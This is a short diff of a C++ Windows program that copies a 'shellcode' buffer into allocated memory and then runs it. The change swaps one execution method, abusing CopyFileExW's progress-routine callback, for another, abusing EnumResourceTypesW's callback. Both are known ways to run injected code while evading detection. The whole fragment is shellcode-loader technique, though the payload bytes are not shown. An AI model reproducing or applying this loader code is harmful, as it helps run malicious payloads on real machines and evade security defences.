@@ -43,7 +43,7 @@ int main()
         return err("VirtualAlloc Failure");
 
     ::RtlMoveMemory(buf, shellcode, sizeof(shellcode));
-    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
-    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)buf, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
 
+    ::EnumResourceTypesW(::LoadLibraryW(L"Kernel32.dll"), (ENUMRESTYPEPROCW)buf, NULL);
+    
 }
